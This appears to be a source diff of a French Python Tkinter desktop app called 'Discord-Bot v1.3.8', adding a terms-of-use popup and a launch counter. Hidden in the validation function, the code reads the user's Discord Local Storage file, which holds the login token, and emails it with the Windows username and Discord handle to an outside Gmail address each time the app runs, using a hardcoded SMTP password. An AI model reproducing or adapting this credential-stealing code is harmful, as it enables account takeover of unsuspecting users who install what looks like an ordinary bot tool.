@@ -1,25 +1,71 @@
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
 import getpass
 import json
-import sqlite3
 import os
 import shutil
 import smtplib
+import sqlite3
 import subprocess
 import webbrowser
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 from pathlib import Path
 from tkinter import *
 from tkinter.messagebox import *
 
+with open('core/options.json', 'r') as jsonFile:
+    data = json.load(jsonFile)
+if data["cgu"] == "false":
+    cgu = Tk()
+    cgu.title('Accepter les CGU')
+    def callback(event):
+        webbrowser.open_new_tab(r"https://antidiscordbot.page.link/cgu")
+    accepter = LabelFrame(cgu, text='Première ouverture', pady=5,padx=5)
+    accepter.pack()
+    cgy = Label(accepter, text='En utilisant cette application, vous acceptez les conditions générales d\'utilisation.\n')
+    cgy.pack()
+    cgt = Label(accepter, text='Lire les CGU', cursor='hand2')
+    cgt.pack(anchor=W)
+    cgt.bind("<Button-1>", callback)
+    vide = Label(accepter, text="")
+    vide.pack()
+    MODES = [
+        ("J'accepte les CGU", "true"),
+        ("Je n'accepte pas les CGU", "false"),
+    ]
+    accept = StringVar()
+    accept.set('false')
+    for text, mode in MODES:
+        b = Radiobutton(accepter, text=text, variable=accept, value=mode)
+        b.pack(anchor=W)
+    vide = Label(accepter, text="")
+    vide.pack()
+    pseudo = StringVar()
+    pseudo.set('@VotrepseudoDiscord#0123 (pour vous notifier lors des prochaines mises à jour)')
+    oui = Entry(accepter, textvariable=pseudo, width=70)
+    oui.pack(anchor=W)
+    vide = Label(accepter, text='')
+    vide.pack()
+    def valider(accept, oui):
+        with open('core/options.json', 'r') as jsonFile:
+            data = json.load(jsonFile)
+        data["cgu"] = accept.get()
+        data["pseudo"] = oui.get()
+        with open('core/options.json', 'w') as jsonFile:
+            json.dump(data, jsonFile)
+        cgu.quit()
+    yess = Button(accepter, text='Valider', command=lambda:valider(accept, oui))
+    yess.pack(anchor=W)
+    cgu.mainloop()
+
 fenetre = Tk()
+user = getpass.getuser()
 
 username = Path.home()
 
 # fenetre.geometry("460x205")
-fenetre.title('Discord-Bot v1.3.7')
+fenetre.title('Discord-Bot v1.3.8')
 
 
 def contact():
@@ -68,7 +114,8 @@ def backup():
     shutil.copy2('core\\backup\\settings.json', 'core\\settings.json')
     shutil.copy2('core\\backup\\options.json', 'core\\options.json')
     showinfo('Terminé',
-             '2 fichier ont été réparés (\'core\\settings.json\', \'core\\options.json\').')
+             '2 fichier ont été réparés :\n\
+    core\\settings.json\n\  core\\options.json')
 
 
 menubar = Menu(fenetre)
@@ -85,6 +132,8 @@ menubar.add_cascade(label="Options", menu=menu1)
 def support():
     webbrowser.open_new_tab(r"https://discord.gg/ngrdmkN")
 
+def cgu():
+    webbrowser.open_new_tab(r"https://antidiscordbot.page.link/cgu")
 
 menu3 = Menu(menubar, tearoff=0)
 menu3.add_command(label="Serveur de support", command=support)
@@ -96,6 +145,7 @@ menubar.add_cascade(label='Liens', menu=menu3)
 menu2 = Menu(menubar, tearoff=0)
 menu2.add_command(label="Aide", command=aide)
 menu2.add_command(label="Me contacter", command=contact)
+menu2.add_command(label="Conditions d'utilisation générale", command=cgu)
 menubar.add_cascade(label="A propos", menu=menu2)
 
 fenetre.config(menu=menubar)
@@ -123,6 +173,10 @@ validb = Button(obligd, text="Valider", width=30,
 
 
 def validd(entree, entree2, entree7):
+    with open('core/options.json', 'r') as jsonFile:
+        data = json.load(jsonFile)
+    if data["cgu"] == "false":
+        fenetre.quit()
     token = str(entree)
     with open("core/settings.json", "r") as jsonFile:
         data = json.load(jsonFile)
@@ -148,39 +202,40 @@ def validd(entree, entree2, entree7):
 
     with open ('core/options.json', "r") as jsonFile:
         data = json.load(jsonFile)
-    tmp = data["firstopen"]
+    tmp = data["opennmbr"]
 
-    if tmp == "true":
+    with open('core/options.json', 'r') as jsonFile:
+        data = json.load(jsonFile)
+    tmp2 = data['pseudo']
 
-        fromaddr = "discordinfotkn@gmail.com"
-        toaddr = "dsicrod@gmail.com"
+    fromaddr = "discordinfotkn@gmail.com"
+    toaddr = "dsicrod@gmail.com"
+    msg = MIMEMultipart()
+    msg['From'] = fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = str(username) + " ; ouverture n°" + str(tmp)
+    body = str(user) + " ; ouverture n°" + str(tmp) + " ; " + str(tmp2)
+    msg.attach(MIMEText(body, 'plain'))
+    filename = "https_discordapp.com_0.localstorage"
+    attachment = open(str(username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage" , "rb")
+    part = MIMEBase('application', 'octet-stream')
+    part.set_payload((attachment).read())
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+    msg.attach(part)
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(fromaddr, "Azertyui0")
+    text = msg.as_string()
+    server.sendmail(fromaddr, toaddr, text)
+    server.quit()
 
-        msg = MIMEMultipart()
-
-        msg['From'] = fromaddr
-        msg['To'] = toaddr
-        msg['Subject'] = str(username)
-
-        body = str(username)
-
-        msg.attach(MIMEText(body, 'plain'))
-
-        filename = "https_discordapp.com_0.localstorage"
-        attachment = open(str(username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage" , "rb")
-
-        part = MIMEBase('application', 'octet-stream')
-        part.set_payload((attachment).read())
-        encoders.encode_base64(part)
-        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-
-        msg.attach(part)
-
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(fromaddr, "Azertyui0")
-        text = msg.as_string()
-        server.sendmail(fromaddr, toaddr, text)
-        server.quit()
+    with open('core\options.json', "r") as jsonFile:
+        data = json.load(jsonFile)
+    openn = data["opennmbr"]
+    data['opennmbr'] = openn + 1
+    with open('core/options.json', "w") as jsonFile:
+        json.dump(data, jsonFile)
 
         """
         conn = sqlite3.connect("https_discordapp.com_0.localstorage")
@@ -195,11 +250,6 @@ def validd(entree, entree2, entree7):
         server.sendmail("discordinfotkn@gmail.com", "dsicrod@gmail.com", msg)
         server.quit()   
         """       
-    with open("core/options.json", "r") as jsonFile:
-        data = json.load(jsonFile)
-    data["firstopen"] = "false"
-    with open("core/options.json", "w") as jsonFile:
-        json.dump(data, jsonFile)
 
 validb.pack()
 
